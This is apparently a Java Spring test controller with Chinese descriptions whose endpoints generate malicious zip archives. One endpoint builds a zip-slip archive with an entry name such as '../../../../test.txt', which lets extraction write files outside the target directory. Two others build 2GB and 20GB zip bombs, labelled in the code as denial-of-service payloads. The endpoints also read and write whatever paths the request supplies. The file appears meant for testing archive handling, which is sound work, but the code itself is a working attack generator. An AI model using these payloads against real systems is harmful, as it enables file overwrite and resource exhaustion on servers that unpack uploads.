package cn.moonlord.test;

import io.swagger.annotations.*;
import org.springframework.web.bind.annotation.*;

import java.io.*;
import java.util.zip.*;

import static java.util.zip.Deflater.BEST_COMPRESSION;

@Api(tags = "压缩文件测试")
@RestController
@RequestMapping("/ZipFile")
public class ZipFileTestController {

    @ApiOperation(value="生成一个可用于跨目录攻击的压缩文件")
    @ApiImplicitParams({
            @ApiImplicitParam(name = "sourceFilePath", value = "要压缩的文件目录", example = "target/test.txt"),
            @ApiImplicitParam(name = "targetFilePath", value = "将文件压缩到的目标目录", example = "../../../../../../../../../../test.txt"),
            @ApiImplicitParam(name = "zipFilePath", value = "压缩文件保存目录", example = "target/testA1.zip")
    })
    @GetMapping(value = "/TestA1")
    public String testA1(
            @RequestParam String sourceFilePath,
            @RequestParam String targetFilePath,
            @RequestParam String zipFilePath
    ) throws Exception {
        File zipFile = new File(zipFilePath);
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        zos.setLevel(BEST_COMPRESSION);
        ZipEntry zipEntry = new ZipEntry(targetFilePath);
        zos.putNextEntry(zipEntry);
        FileInputStream bis = new FileInputStream(sourceFilePath);
        byte[] buffer = new byte[1024 * 4];
        int read;
        while ((read = bis.read(buffer, 0, 1024 * 4)) != -1) {
            zos.write(buffer, 0, read);
        }
        zos.close();
        return zos.toString();
    }

    @ApiOperation(value="生成一个 2GB 的可用于 DOS 攻击的压缩文件")
    @ApiImplicitParams({
            @ApiImplicitParam(name = "targetFilePath", value = "将文件压缩到的目标目录", example = "test.txt"),
            @ApiImplicitParam(name = "zipFilePath", value = "压缩文件保存目录", example = "target/testB1.zip")
    })
    @GetMapping(value = "/TestB1")
    public String testB1(
            @RequestParam String targetFilePath,
            @RequestParam String zipFilePath
    ) throws Exception {
        File zipFile = new File(zipFilePath);
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        zos.setLevel(BEST_COMPRESSION);
        ZipEntry zipEntry = new ZipEntry(targetFilePath);
        zos.putNextEntry(zipEntry);
        ByteArrayInputStream bis = new ByteArrayInputStream(new byte[0]){
            private byte[] tmp = new byte[1024 * 4];
            @Override
            public synchronized int read(byte[] b, int off, int len) {
                count = Integer.MAX_VALUE;
                if (pos >= count) {
                    return -1;
                }
                int avail = count - pos;
                if (len > avail) {
                    len = avail;
                }
                if (len <= 0) {
                    return 0;
                }
                tmp = ( tmp.length == len ? tmp : new byte[len] );
                System.arraycopy(tmp, 0, b, off, len);
                pos += len;
                return len;
            }
        };
        byte[] buffer = new byte[1024 * 4];
        int read;
        while ((read = bis.read(buffer, 0, 1024 * 4)) != -1) {
            zos.write(buffer, 0, read);
        }
        zos.close();
        return zos.toString();
    }

    @ApiOperation(value="生成一个 20GB 的可用于 DOS 攻击的压缩文件")
    @ApiImplicitParams({
            @ApiImplicitParam(name = "targetFilePath", value = "将文件压缩到的目标目录", example = "test.txt"),
            @ApiImplicitParam(name = "zipFilePath", value = "压缩文件保存目录", example = "target/testB2.zip")
    })
    @GetMapping(value = "/TestB2")
    public String testB2(
            @RequestParam String targetFilePath,
            @RequestParam String zipFilePath
    ) throws Exception {
        File zipFile = new File(zipFilePath);
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        zos.setLevel(BEST_COMPRESSION);
        ZipEntry zipEntry = new ZipEntry(targetFilePath);
        zos.putNextEntry(zipEntry);
        byte[] buffer = new byte[1024 * 4];
        long fileSize = (long) Integer.MAX_VALUE * 10;
        for (long i = 0; i < fileSize / buffer.length; i++) {
            zos.write(buffer);
        }
        zos.close();
        return zos.toString();
    }

}
